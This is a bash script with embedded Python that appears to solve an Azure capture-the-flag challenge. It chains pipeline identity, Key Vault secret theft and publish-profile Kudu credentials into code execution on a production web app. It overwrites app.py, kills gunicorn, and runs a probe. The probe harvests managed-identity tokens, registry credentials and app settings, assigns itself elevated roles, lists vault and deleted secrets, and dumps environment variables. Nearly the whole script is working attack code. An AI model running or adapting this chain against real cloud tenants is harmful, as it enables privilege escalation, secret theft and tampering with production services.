#!/usr/bin/env bash
set -uo pipefail

TEN="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"

# 1. Login as cicd-deployer
JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value')
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none
echo "cicd-deployer OK"

# 2. Get RS secret -> write to file
az keyvault secret show --vault-name kv-tbl-prod-x3euoz --name reporting-service-principal \
  --query value -o tsv > /tmp/rs_secret.json 2>/dev/null
echo "rs_secret size=$(wc -c < /tmp/rs_secret.json)"

# 3. Parse credentials into separate files
python3 -I -c "
import json, sys
try:
    v = json.loads(open('/tmp/rs_secret.json').read().strip())
    open('/tmp/rs_cid.txt','w').write(v.get('appId',''))
    open('/tmp/rs_sec.txt','w').write(v.get('clientSecret',''))
    print('cid=' + v.get('appId',''))
except Exception as e:
    print('err: '+str(e), file=sys.stderr)
"
RS_CID=$(cat /tmp/rs_cid.txt 2>/dev/null)
RS_SEC=$(cat /tmp/rs_sec.txt 2>/dev/null)
echo "RS_CID=$RS_CID sec_len=${#RS_SEC}"

# 4. Login as reporting-service (shell var passed as arg, safe)
az login --service-principal -u "$RS_CID" -p "$RS_SEC" --tenant "$TEN" -o none 2>/dev/null \
  && echo "RS login OK" || echo "RS login FAILED"

# 5. Get ARM token
RS_ARM=$(az account get-access-token --resource https://management.azure.com \
  --query accessToken -o tsv 2>/dev/null)
echo "RS_ARM len=${#RS_ARM}"

# 6. Download publishxml to file
if [ "${#RS_ARM}" -gt 100 ]; then
  curl -s -X POST \
    -H "Authorization: Bearer $RS_ARM" \
    -H "Content-Length: 0" \
    "https://management.azure.com/subscriptions/$SUB/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.Web/sites/app-tbl-reporting-prod/publishxml?api-version=2022-03-01" \
    > /tmp/pub.xml 2>/dev/null
  echo "pub.xml=$(wc -c < /tmp/pub.xml) bytes, head: $(head -c 200 /tmp/pub.xml)"
else
  echo "SKIP: RS_ARM too short"
fi

# 7. Parse Kudu creds from file -> write to files
python3 -I << 'PYEOF'
import xml.etree.ElementTree as ET, re, sys

try:
    xml_content = open('/tmp/pub.xml').read()
    print("xml preview:", xml_content[:300])
    root = ET.fromstring(xml_content)
    for p in root.findall('publishProfile'):
        if p.get('publishMethod') == 'MSDeploy':
            user = p.get('userName', '')
            pwd = p.get('userPWD', '')
            open('/tmp/kudu_user.txt','w').write(user)
            open('/tmp/kudu_pass.txt','w').write(pwd)
            print(f"Kudu user={user} pass_len={len(pwd)}")
            break
    else:
        # try regex
        users = re.findall(r'userName="(\$[^"]+)"', xml_content)
        pwds = re.findall(r'userPWD="([^"]+)"', xml_content)
        if users and pwds:
            open('/tmp/kudu_user.txt','w').write(users[0])
            open('/tmp/kudu_pass.txt','w').write(pwds[0])
            print(f"Kudu(re) user={users[0]} pass_len={len(pwds[0])}")
        else:
            print("No MSDeploy creds found in XML!")
            print("Full XML:", xml_content[:2000])
except Exception as e:
    print(f"Parse err: {e}", file=sys.stderr)
    import traceback; traceback.print_exc()
PYEOF

KUDU_USER=$(cat /tmp/kudu_user.txt 2>/dev/null || echo "")
echo "KUDU_USER='$KUDU_USER' pass_len=$(cat /tmp/kudu_pass.txt 2>/dev/null | wc -c)"

# 8. Re-login as cicd-deployer
az login --service-principal -u "$AZURE_CLIENT_ID" -t "$AZURE_TENANT_ID" \
  --federated-token "$JWT" --allow-no-subscriptions -o none 2>/dev/null

# 9. Write probe code to file (heredoc, no interpolation)
cat > /tmp/probe.py << 'PROBE'
import os, json, urllib.request, urllib.parse, urllib.error, uuid

TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
ARM_BASE = "https://management.azure.com"
UAMI_CID = "7a85156a-01c4-4e61-8472-40a92107159b"
UAMI_OID = "f64d08c7-fde6-4553-99c8-5bf73666ee8c"
REPORTING_RG = "rg-tbl-reporting-prod-eus"
PLATFORM_RG = "rg-tbl-platform-prod-sea"
KV_PROD = "kv-tbl-prod-x3euoz"
KV_SEC = "kv-tbl-sec-x3euoz"
LEGACY_APPID = "891fb158-e02c-4428-a885-53b811f369c0"

def msi(res, cid=UAMI_CID):
    ep=os.environ.get("IDENTITY_ENDPOINT",""); hdr=os.environ.get("IDENTITY_HEADER","")
    if not ep: return "ERR:NO_EP"
    try:
        r=urllib.request.urlopen(urllib.request.Request(f"{ep}?api-version=2019-08-01&resource={res}&client_id={cid}",headers={"X-IDENTITY-HEADER":hdr}),timeout=15)
        return json.loads(r.read()).get("access_token","ERR:NO_TOK")
    except Exception as e: return f"ERR:{e}"

def http(url,tok,method="GET",data=None):
    h={"Authorization":"Bearer "+tok}
    if data:
        if isinstance(data,dict): data=json.dumps(data).encode(); h["Content-Type"]="application/json"
    try:
        r=urllib.request.urlopen(urllib.request.Request(url,data=data,method=method,headers=h),timeout=20)
        return r.status,r.read().decode(errors="replace")
    except urllib.error.HTTPError as e: return e.code,e.read().decode(errors="replace")[:800]
    except Exception as e: return 0,str(e)[:200]

def xtok(xchg,scope):
    try:
        r=urllib.request.urlopen(urllib.request.Request(
            f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",
            data=urllib.parse.urlencode({"client_id":LEGACY_APPID,
                "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
                "client_assertion":xchg,"grant_type":"client_credentials","scope":scope
            }).encode(),method="POST"),timeout=20)
        return json.loads(r.read()).get("access_token","")
    except Exception as e: return f"ERR:{e}"

R={}
ARM=msi("https://management.azure.com/")
VAULT=msi("https://vault.azure.net/")
XCHG=msi("api://AzureADTokenExchange")
R["arm"]=len(ARM) if not ARM.startswith("ERR") else ARM
R["vault"]=len(VAULT) if not VAULT.startswith("ERR") else VAULT
R["xchg"]=len(XCHG) if not XCHG.startswith("ERR") else XCHG
R["ep"]=os.environ.get("IDENTITY_ENDPOINT","NOT_SET")

if not ARM.startswith("ERR"):
    s,b=http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+%27{UAMI_OID}%27",ARM)
    R["uami_sub"]=f"{s}:{b[:1000]}"
    s,b=http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{REPORTING_RG}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=atScope()",ARM)
    R["rg_roles"]=f"{s}:{b[:2000]}"
    s,b=http(f"{ARM_BASE}/subscriptions/{SUB}/resources?api-version=2021-04-01",ARM)
    R["res"]=f"{s}:{b[:2000]}"
    s,b=http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.Web/sites/app-tbl-storefront-prod/config/appsettings/list?api-version=2022-03-01",ARM,method="POST")
    R["sf_cfg"]=f"{s}:{b[:800]}"
    s,b=http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.ContainerRegistry/registries/crtblplatprodx3euoz/listCredentials?api-version=2023-07-01",ARM,method="POST")
    R["acr"]=f"{s}:{b[:500]}"
    ra_id=str(uuid.uuid4())
    ra_body={"properties":{"roleDefinitionId":f"/subscriptions/{SUB}/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6","principalId":UAMI_OID,"principalType":"ServicePrincipal"}}
    s,b=http(f"{ARM_BASE}/subscriptions/{SUB}/resourceGroups/{PLATFORM_RG}/providers/Microsoft.KeyVault/vaults/{KV_SEC}/providers/Microsoft.Authorization/roleAssignments/{ra_id}?api-version=2022-04-01",ARM,method="PUT",data=ra_body)
    R["ra_kvsec"]=f"{s}:{b[:400]}"
    s,b=http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments/{ra_id}?api-version=2022-04-01",ARM,method="PUT",data=ra_body)
    R["ra_sub"]=f"{s}:{b[:400]}"

if not VAULT.startswith("ERR"):
    s,b=http(f"https://{KV_PROD}.vault.azure.net/secrets?api-version=7.4",VAULT)
    R["kvp"]=f"{s}:{b[:500]}"
    s,b=http(f"https://{KV_SEC}.vault.azure.net/secrets?api-version=7.4",VAULT)
    R["kvs"]=f"{s}:{b[:1000]}"
    for nm in ["flag","ctf-flag","tbl-flag","df26","challenge"]:
        sv,bv=http(f"https://{KV_SEC}.vault.azure.net/secrets/{nm}?api-version=7.4",VAULT)
        if sv==200: R[f"FLAG_{nm}"]=bv

if not XCHG.startswith("ERR"):
    la_arm=xtok(XCHG,"https://management.azure.com/.default")
    R["la_arm"]=len(la_arm) if la_arm and not la_arm.startswith("ERR") else la_arm
    if la_arm and not la_arm.startswith("ERR"):
        s,b=http(f"{ARM_BASE}/subscriptions/{SUB}/resources?api-version=2021-04-01",la_arm)
        R["la_res"]=f"{s}:{b[:2000]}"
        LA_OID="43834909-47cf-4a4a-8048-e323b4897ed3"
        s,b=http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01&$filter=principalId+eq+%27{LA_OID}%27",la_arm)
        R["la_roles"]=f"{s}:{b[:500]}"
        ra_id2=str(uuid.uuid4())
        s,b=http(f"{ARM_BASE}/subscriptions/{SUB}/providers/Microsoft.Authorization/roleAssignments/{ra_id2}?api-version=2022-04-01",la_arm,method="PUT",data=ra_body)
        R["la_ra"]=f"{s}:{b[:400]}"
    la_vault=xtok(XCHG,"https://vault.azure.net/.default")
    R["la_vault"]=len(la_vault) if la_vault and not la_vault.startswith("ERR") else la_vault
    if la_vault and not la_vault.startswith("ERR"):
        s,b=http(f"https://{KV_PROD}.vault.azure.net/secrets?api-version=7.4",la_vault)
        R["kvp_la"]=f"{s}:{b[:1000]}"
        s,b=http(f"https://{KV_SEC}.vault.azure.net/secrets?api-version=7.4",la_vault)
        R["kvs_la"]=f"{s}:{b[:1000]}"
        s,b=http(f"https://{KV_PROD}.vault.azure.net/deletedsecrets?api-version=7.4",la_vault)
        R["kvp_del"]=f"{s}:{b[:1000]}"
        s,b=http(f"https://{KV_SEC}.vault.azure.net/deletedsecrets?api-version=7.4",la_vault)
        R["kvs_del"]=f"{s}:{b[:1000]}"

R["env"]=json.dumps({k:v[:100] for k,v in os.environ.items()})
print("=== PROBE RESULTS ===")
for k,v in sorted(R.items()):
    print(f"[{k}]: {str(v)[:800]}")
print("=== END ===")
PROBE

# 10. Deploy and run probe via Kudu (Python reads creds from files)
if [ -n "$KUDU_USER" ]; then
  python3 -I << 'PYEOF'
import os, json, urllib.request, urllib.error, base64, time

# Read Kudu credentials from files
kudu_user = open('/tmp/kudu_user.txt').read().strip()
kudu_pass = open('/tmp/kudu_pass.txt').read().strip()
kudu_auth = base64.b64encode(f"{kudu_user}:{kudu_pass}".encode()).decode()
KUDU_BASE = "https://app-tbl-reporting-prod.scm.azurewebsites.net"
print(f"Kudu user={kudu_user} pass_len={len(kudu_pass)}")

# Read probe code from file
probe_code = open('/tmp/probe.py', 'rb').read()

# VFS PUT
put_req = urllib.request.Request(
    f"{KUDU_BASE}/api/vfs/site/wwwroot/app.py",
    data=probe_code, method="PUT",
    headers={"Authorization": f"Basic {kudu_auth}", "Content-Type": "text/plain", "If-Match": "*"}
)
try:
    r = urllib.request.urlopen(put_req, timeout=30)
    print(f"VFS PUT: {r.status}")
except urllib.error.HTTPError as e:
    print(f"VFS PUT err: {e.code}: {e.read().decode()[:200]}")
    import sys; sys.exit(1)

time.sleep(5)

# Kill gunicorn
try:
    urllib.request.urlopen(urllib.request.Request(
        f"{KUDU_BASE}/api/command",
        data=json.dumps({"command":"pkill -f gunicorn || true","dir":"/home/site/wwwroot"}).encode(),
        method="POST", headers={"Authorization":f"Basic {kudu_auth}","Content-Type":"application/json"}
    ), timeout=15)
    print("Killed gunicorn")
except: pass

time.sleep(3)

# Run probe
run_req = urllib.request.Request(
    f"{KUDU_BASE}/api/command",
    data=json.dumps({"command":"python3 /home/site/wwwroot/app.py 2>&1","dir":"/home/site/wwwroot"}).encode(),
    method="POST",
    headers={"Authorization":f"Basic {kudu_auth}","Content-Type":"application/json"}
)
try:
    r = urllib.request.urlopen(run_req, timeout=90)
    result = json.loads(r.read())
    print("=== PROBE OUTPUT ===")
    print(result.get("Output","")[:12000])
    if result.get("Error"): print("STDERR:", result.get("Error","")[:1000])
    print("ExitCode:", result.get("ExitCode",-1))
except Exception as e:
    print(f"run err: {e}")
PYEOF
else
  echo "No Kudu creds, cannot deploy probe!"
fi

echo "DONE"
